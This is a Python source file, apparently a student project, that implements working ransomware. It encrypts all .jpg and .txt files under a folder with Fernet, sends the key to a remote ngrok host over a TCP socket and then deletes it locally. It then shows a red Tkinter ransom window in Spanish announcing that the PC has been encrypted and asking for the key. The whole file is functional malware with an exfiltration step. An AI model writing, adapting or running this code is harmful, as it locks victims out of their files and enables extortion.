from tkinter import *
from cryptography.fernet import Fernet
import os
import os.path
import socket

ruta="C:/Users/Adrian/Desktop/HugoUNI/3erCicloUNI/POO/TristeCarpetaEncriptada"

extensiones=('.jpg','.txt')


def encrypt(nom_archivo, clave):
    f=Fernet(clave)
    with open(nom_archivo, "rb") as file:
        archivo_info=file.read()
    info_encrypt=f.encrypt(archivo_info)
    with open(nom_archivo, "wb") as file:
        file.write(info_encrypt)

def desencript(nom_Archivo, clave):
    f=Fernet(clave)
    with open(nom_Archivo, "rb") as file:
        encrypted_data=file.read()
    decrypted_data=f.decrypt(encrypted_data)
    with open(nom_Archivo, "wb") as file:
        file.write(decrypted_data)

def desencriptAll(ruta,clave):
    for dirpath, dirnames, filenames in os.walk(ruta):
            for file in filenames:
                file_path,file_ext=os.path.splitext(dirpath+'/'+file)
                if file_ext in extensiones:
                   desencript(dirpath+"/"+file,clave)


def encryptAll(ruta,clave):
    for dirpath,dirnames,filenames in os.walk(ruta):
            for file in filenames:
                file_path,file_ext=os.path.splitext(dirpath+'/'+file) #os.path.splitext() te da un array de 2 elementos: ruta,extensión
                if file_ext in extensiones:
                    encrypt(dirpath+"/"+file,clave)


def genera_clave():
    clave=Fernet.generate_key()                   # GENERA UNA CLAVE ALEATORIA 
    with open("clave.key","wb") as archivo_clave: #GUARDA LA CLAVE DENTRO DEL ARCHIVO clave.key
        archivo_clave.write(clave)

def cargar_clave():
    return open("clave.key", "rb").read()

def fileToServer():

    IP = socket.gethostbyname('4.tcp.ngrok.io') #--------COLOCAR HOST DE NGROK
    PORT = 17142 #---------------------------------------COLOCAR PUERTO DE NGROK
    ADDR = (IP, PORT)
    FORMAT = "utf-8"
    SIZE = 1024


    """ Staring a TCP socket. """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
    """ Connecting to the server. """
    client.connect(ADDR)
 
    """ Opening and reading the file data. """
    file = open("clave.key", "r")
    data = file.read()
 
    """ Sending the filename to the server. """
    client.send("clave.key".encode(FORMAT))
    msg = client.recv(SIZE).decode(FORMAT)
 
    """ Sending the file data to the server. """
    client.send(data.encode(FORMAT))
    msg = client.recv(SIZE).decode(FORMAT)
 
    """ Closing the file. """
    file.close()
 
    """ Closing the connection from the server. """
    client.close()

    
    os.remove("clave.key")


def send_data():
    password_data=str(password.get()).encode()
    if(password_data==claveCifrado):

        desencriptAll(ruta,claveCifrado)

        etiqueta=Label(ventana,text="Gracias por tu apoyo. Tu PC ha sido correctamente desencriptada",font={"Oswald",40},fg="white",bg="red")
        etiqueta.pack()


genera_clave()
claveCifrado=cargar_clave()
encryptAll(ruta,claveCifrado)
fileToServer()


ventana=Tk()
ventana.title("RDH2022")
ventana.config(bg="red")
ventana.geometry("480x200")
ventana.resizable(0,0)
ventana.config(cursor="pirate")

etiqueta=Label(ventana,text="¡¡¡TU PC HA SIDO ENCRIPTADA!!!",font={"Oswald",40},fg="white",bg="red")
etiqueta.place(x=50,y=50)
etiqueta.pack()

floro="Tus archivos dentro de una carpeta se han encriptado:\n fotos, videos, documentos, etc.\nLee el README para saber cómo recuperar tus datos\n "

texto=Label(ventana,text=floro, font={"Oswald",40},fg="white")
texto.config(bg="red")
texto.pack()

password=StringVar()

password_entry=Entry(textvariable= password, width="40")
password_entry.pack()

boton=Button(ventana, text="Enviar clave", command=send_data)
boton.pack()

ventana.mainloop()